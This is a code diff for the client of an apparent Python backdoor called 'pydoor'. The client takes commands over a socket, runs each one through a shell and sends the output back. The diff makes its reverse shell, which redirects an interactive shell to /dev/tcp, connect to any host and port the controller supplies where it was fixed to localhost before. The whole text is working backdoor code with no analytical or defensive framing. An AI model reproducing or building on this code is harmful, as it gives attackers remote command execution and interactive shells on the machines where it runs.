@@ -45,10 +45,9 @@ class Client:
         if self.cmd:
             print(self.cmd)
             self.argumentize()
-            #print(self.args[0])
 
             if self.args[0] == "shell":
-                subprocess.run([self.shell + " -i >& /dev/tcp/127.0.0.1/8888 0>&1"], shell=True)
+                subprocess.run([self.shell + f" -i >& /dev/tcp/{self.args[1]}/{self.args[2]} 0>&1"], shell=True)
             elif self.args[0] == "quit":
                 self.sock.send(b"pydoor.quit")
                 sys.exit(0)
@@ -66,7 +65,7 @@ class Client:
 
             
             else:
-                j = subprocess.getoutput(self.shell + " -c '" + self.cmd + "'")
+                j = subprocess.getoutput(self.shell + " -c '" + self.cmd + "'") #Pretty much every shell uses -c to run lone commands.
                 self.sock.send(j.encode())
 
     def start(self):
